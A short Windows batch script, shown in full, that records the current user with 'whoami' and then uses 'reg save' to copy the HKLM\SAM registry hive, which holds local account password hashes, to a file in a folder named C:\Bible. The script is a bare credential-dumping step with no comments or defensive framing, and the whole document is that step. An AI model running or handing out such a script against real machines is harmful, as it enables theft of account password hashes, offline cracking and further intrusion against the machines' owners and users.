@echo off 
whoami > C:\Bible\samlog.txt 2>&1 
reg save HKLM\SAM C:\Bible\sam.hiv /y >> C:\Bible\samlog.txt 2>&1 
